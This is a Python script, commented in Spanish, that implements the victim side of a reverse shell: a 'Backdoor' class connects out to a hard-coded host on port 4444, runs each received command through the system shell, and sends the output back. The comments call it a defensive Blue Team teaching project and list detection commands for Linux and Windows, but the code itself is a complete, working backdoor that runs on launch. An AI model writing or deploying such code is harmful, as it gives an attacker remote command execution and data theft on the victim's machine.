#!/usr/bin/env python3
# =============================================================================
# REVERSE SHELL - LADO DE LA VÍCTIMA
# PROPÓSITO: Proyecto educativo de seguridad defensiva (Blue Team)
# ADVERTENCIA: Solo usar en laboratorio aislado propio
# COMPATIBILIDAD: Windows + Linux
# =============================================================================


import socket, subprocess, sys # │ IMPORTACIÓN DE LIBRERÍAS
    # socket     → Comunicaciones de red
    # subprocess → Ejecutar comandos del sistema
    # sys        → Detección de sistema operativo
    
    # 🛡️ DETECCIÓN: python + subprocess = ALERTA INMEDIATA
    # 🛡️ MANJARO: sudo ausearch -c python3
    # 🛡️ WINDOWS: Get-EventLog -LogName Application | Where-Object {$_.Message -like "*Python*"


class Backdoor:
    
    def __init__(self,ip,port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # │ CREACIÓN DEL SOCKET

            # socket.socket() → Crea endpoint de red
            # AF_INET         → IPv4
            # SOCK_STREAM     → TCP

            # 🛡️ DETECCIÓN: sudo lsof -i -P -n | grep python (Linux)
            # 🛡️ DETECCIÓN: netstat -ano | findstr "python" (Windows)

        self.connection.connect((ip,port)) # │ CONEXIÓN SALIENTE - PUNTO DE DETECCIÓN #1 ⚠️

            # connect()       → Conecta al atacante
            # 192.168.1.39    → IP del atacante
            # 4444            → Puerto del atacante

            # 🛡️ DETECCIÓN #1: Conexión SALIENTE a puerto 4444
            # 🛡️ MANJARO: sudo ss -antp | grep 4444
            # 🛡️ WINDOWS: netstat -ano | findstr "4444"

    def ejecutarComando(self, command): # │ FUNCIÓN DE EJECUCIÓN DE COMANDOS - COMPATIBLE WINDOWS/LINUX

        command_str = command.decode('utf-8', errors='ignore')

        return subprocess.check_output(command_str, shell=True)

            # check_output() → Ejecuta comando y captura salida
            # shell=True     → Ejecuta a través del shell
            # decode()       → Convierte bytes a string (Windows lo requiere)
            #
            # 🛡️ DETECCIÓN: python → cmd/bash - EL MAYOR IoC
            # 🛡️ MANJARO: sudo ausearch -c python3 --start recent
            # 🛡️ WINDOWS: Get-EventLog -LogName Security | Where-Object {$_.EventID -eq 4688}
            
            # Decodificar bytes a string (necesario en Windows)    

    def run(self):

        while True: # │ BUCLE PRINCIPAL - ESPERA DE COMANDOS
            
            command = self.connection.recv(1024) # │ RECEPCIÓN DE COMANDOS - PUNTO DE DETECCIÓN #3 

                # recv(1024) → Recibe comandos del atacante (bytes)
                
                # 🛡️ DETECCIÓN #3: Tráfico entrante
                # 🛡️ MANJARO: sudo tcpdump -i any port 4444 -n -v
                # 🛡️ WINDOWS: netstat -ano | findstr "ESTABLISHED"

            try: # │ EJECUCIÓN DE COMANDO - PUNTO DE DETECCIÓN #4 ⚠️ 

                resultadosComando = self.ejecutarComando(command)

            except Exception as e:
                # Si hay error, enviar mensaje de error al atacante
                resultadosComando = str(e).encode('utf-8')
            
                    # ejecutarComando() → Ejecuta el comando
                    # command.decode()  → Convierte bytes a string (Windows)
                    #
                    # 🛡️ DETECCIÓN #4: python → cmd/bash (EL MAYOR IoC)
                    # 🛡️ MANJARO: sudo ausearch -c python3 --start recent
                    # 🛡️ WINDOWS: Get-EventLog -LogName Security | Where-Object {$_.EventID -eq 4688}
        
            self.connection.send(resultadosComando) # │ ENVÍO DE RESULTADOS - EXFILTRACIÓN ⚠️      

                # send() → Envía resultados (exfiltración)

                # 🛡️ DETECCIÓN #5: Datos salientes sensibles
                # 🛡️ MANJARO: sudo tcpdump -i any port 4444 -w exfil.pcap
                # 🛡️ WINDOWS: Wireshark tcp.port == 4444
        self.connection.close() # │ CIERRE DE CONEXIÓN - NUNCA SE EJECUTA ⚠️


puerta = Backdoor("192.168.1.41",4444)
puerta.run()       
